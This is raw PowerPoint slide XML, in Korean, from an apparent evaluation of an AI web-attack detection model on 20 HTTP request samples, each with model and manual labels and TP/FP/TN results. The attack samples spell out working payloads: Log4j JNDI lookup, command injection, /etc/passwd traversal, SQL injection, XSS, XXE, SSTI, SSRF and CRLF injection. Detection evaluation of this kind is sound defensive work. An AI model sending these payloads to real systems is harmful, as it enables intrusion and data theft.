              <a:t>GET / HTTP/1.1\r\nHost: host-11\r\nUser-Agent: ${jndi:ldap\://192.0.2.123:1389/test-only}\r\nX-Test-Marker: AI-EVAL-9006</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>분류 기준 참고:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.rfc-editor.org/info/rfc5737/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20개 HTTP 요청과 모델 출력. S01~S20은 제공 순서로 부여한 보고서 식별자이며 티켓 ID와 매핑되지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S16 수동=공격 모델=공격 화면값=0.60 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /tools/ping HTTP/1.1\r\nHost: host-12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1%3Bid%3Buname%20-a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S17 수동=공격 모델=공격 화면값=0.63 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /download?file=../../../../etc/passwd HTTP/1.1\r\nHost: host-41\r\nAccept: application/octet-stream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S18 수동=공격 모델=공격 화면값=0.45 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\nHost: host-3\r\nReferer: [https://host-3/](https://host-3/)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S19 수동=공격 모델=공격 화면값=0.57 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /login HTTP/1.1\r\nHost: host-31\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin%27%20AND%20SLEEP%285%29--&amp;password=test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S20 수동=공격 모델=공격 화면값=1.00 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /products?id=10%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: host-7\r\nUser-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>분류 기준 참고:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.rfc-editor.org/info/rfc5737/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개별 화면 값은 사용자 명칭 “정확도”를 보존한다. 산식이 제공되지 않았으므로 확률, 신뢰도, 유사도로 단정하지 않는다. 각 값의 단순 평균은 모델 정확도가 아니다. 점수와 판정은 사용자 제공 원값이며 차트 데이터는 편집 가능한 리터럴 값이다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S01 0.47 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S02 0.39 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S03 0.48 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S04 0.30 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S05 0.31 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S06 0.60 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S07 0.35 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S08 0.43 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S09 0.27 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S10 0.65 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S11 0.43 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S12 0.46 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S13 0.37 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S14 0.67 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S15 0.51 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S16 0.60 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S17 0.63 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S18 0.45 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S19 0.57 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S20 1.00 공격 TP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권고는 관측 결과(FP 6건)에 대한 후속 검증 제안이며 이미 수행했다는 의미가 아니다. eyeCloudXOARforAll-in-one_v4_ko.pdf p263–266은 Label 변경, 임시저장, Feedback, 강화학습의 별도 절차를 설명한다. 학습/평가 분리 여부와 활성 모델 메타데이터는 사용자 제공 자료에서 확인되지 않았다.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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S01</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /redirect?next=%2Fhome HTTP/1.1\r\nHost: host-37\r\nConnection: close</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.47 모델=공격 수동=정상 결과=FP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S02</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /upload HTTP/1.1\r\nHost: host-11\r\nContent-Type: multipart/form-data; boundary=EVALBOUNDARY\r\n\r\n--EVALBOUNDARY\r\nContent-Disposition: form-data; name="홍길동 11"; filename="C:/ProgramData/Your-Company/SecurityData/event-11.dat"</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.39 모델=정상 수동=정상 결과=TN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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S03</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /login HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=user01&amp;password=incorrect-password</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.48 모델=공격 수동=정상 결과=FP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S04</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /health HTTP/1.1\r\nHost: host-22\r\nUser-Agent: kube-probe/1.30\r\nAccept: */*</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.30 모델=정상 수동=정상 결과=TN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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S05</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /api/search HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/json\r\n\r\n{"operator":"union","fields":["name","department"],"page":1}</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.31 모델=공격 수동=정상 결과=FP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S06</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /tools/ping HTTP/1.1\r\nHost: host-12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1&amp;count=4</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.60 모델=공격 수동=정상 결과=FP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S07</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /download?file=quarterly..final.pdf HTTP/1.1\r\nHost: host-41\r\nAccept: application/pdf</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.35 모델=정상 수동=정상 결과=TN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S08</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /docs/search?q=HTML%20script%20element%20reference HTTP/1.1\r\nHost: host-3\r\nReferer: [https://host-3/docs](https://host-3/docs)</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.43 모델=공격 수동=정상 결과=FP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S09</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /search?q=how%20to%20select%20a%20health%20plan HTTP/1.1\r\nHost: host-31\r\nAccept: text/html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.27 모델=정상 수동=정상 결과=TN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S10</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /products?id=10&amp;sort=price&amp;direction=asc HTTP/1.1\r\nHost: host-7\r\nUser-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.65 모델=공격 수동=정상 결과=FP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S11</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /redirect?next=%2Fhome%0D%0AX-Test-Injected%3A%20true HTTP/1.1\r\nHost: host-37\r\nConnection: close</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.43 모델=공격 수동=공격 결과=TP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S12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /api/import HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/xml\r\n\r\n%3C%21DOCTYPE%20r%20%5B%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E%3Cr%3E%26x%3B%3C%2Fr%3E</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.46 모델=공격 수동=공격 결과=TP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S13</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /welcome?name=%7B%7B7\*7%7D%7D HTTP/1.1\r\nHost: host-11\r\nAccept: text/html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.37 모델=공격 수동=공격 결과=TP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S14</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /preview HTTP/1.1\r\nHost: host-22\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nurl=http%3A%2F%2F192.0.2.20%2Flatest%2Fmeta-data</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.67 모델=공격 수동=공격 결과=TP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S15</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET / HTTP/1.1\r\nHost: host-11\r\nUser-Agent: ${jndi:ldap\://192.0.2.123:1389/test-only}\r\nX-Test-Marker: AI-EVAL-9006</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.51 모델=공격 수동=공격 결과=TP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S16</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /tools/ping HTTP/1.1\r\nHost: host-12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1%3Bid%3Buname%20-a</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.60 모델=공격 수동=공격 결과=TP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S17</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /download?file=../../../../etc/passwd HTTP/1.1\r\nHost: host-41\r\nAccept: application/octet-stream</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.63 모델=공격 수동=공격 결과=TP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S18</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\nHost: host-3\r\nReferer: [https://host-3/](https://host-3/)</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.45 모델=공격 수동=공격 결과=TP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S19</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /login HTTP/1.1\r\nHost: host-31\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin%27%20AND%20SLEEP%285%29--&amp;password=test</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.57 모델=공격 수동=공격 결과=TP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S20</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /products?id=10%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: host-7\r\nUser-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=1.00 모델=공격 수동=공격 결과=TP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제공 자료: 이 대화의 20개 샘플 및 20개 티켓, 첨부 원본 PNG.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>로컬 자료: C:/Users/user/Desktop/project/LogGenerator/README.md 264–275행. C:/Users/user/Desktop/AI 서버/eyeCloudXOARforAll-in-one_v4_ko.pdf p263–269. C:/Users/user/Desktop/AI 서버/eyeCloudXOAR-playbook-guide_v4_ko.pdf p74·77–80.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>웹 1차 출처(2026-09-09 확인):</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>sql: https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>path: https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>crlf: https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>xxe: https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>ssti: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>ssrf: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>log4j: https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>command: https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>probes: https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>auth: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>rfc: https://www.rfc-editor.org/info/rfc5737/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>이전 로컬 ai_model_detection_samples.json은 메서드·헤더·정상군이 현재 제공 데이터와 달라 평가에 대체 사용하지 않았다.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55007e23034b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a4e27faa94472f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="/ppt/slideLayouts/slideLayout1.xml" Id="R4a8a623143ae41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8a623143ae41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5e27b662674ab2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide1.xml" Id="Rc13ace9483e641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ce4410d7e9435b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide2.xml" Id="R917aeefb57d2467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e283ba39f8434f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide3.xml" Id="R3b4e83a2afb343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be484ce6304a35" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide4.xml" Id="R3175dd3c43254d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38d23847fe4420" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide5.xml" Id="R64984491fbab4d7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7c9dafbb804af0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/ppt/media/image.png" Id="R7e67d50997274d94" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide6.xml" Id="R302a6007dfcb450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b1171909fd4c95" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide7.xml" Id="R5bdc439cf24c44e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03aa5e229f43a6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide8.xml" Id="Rea308cad0b1a4b9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3b5bee9e0c49d1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide9.xml" Id="R3b6c88f362ac41e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d6c89a76cc4152" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide10.xml" Id="R40c639427be544e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657ea4932243bf" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide11.xml" Id="Ra3ad6465b50e442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a966a896154a70" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide12.xml" Id="Rfa0669fdc3a1440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91fa3b70324751" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/chart" Target="/ppt/slides/charts/chart1.xml" Id="Re2e8672c476a42c4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide13.xml" Id="R39b30cb92ca3496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b88516ea9b45df" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide14.xml" Id="R112853ada3e840c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8a4f5c177b47ce" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide15.xml" Id="R7eea8e715de044b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c1777457e84145" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide16.xml" Id="R8fe2021f22c84d8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ed73e7689d417c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide17.xml" Id="R79f6f9c33eea411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31a7bf6fc64f33" /><Relationship 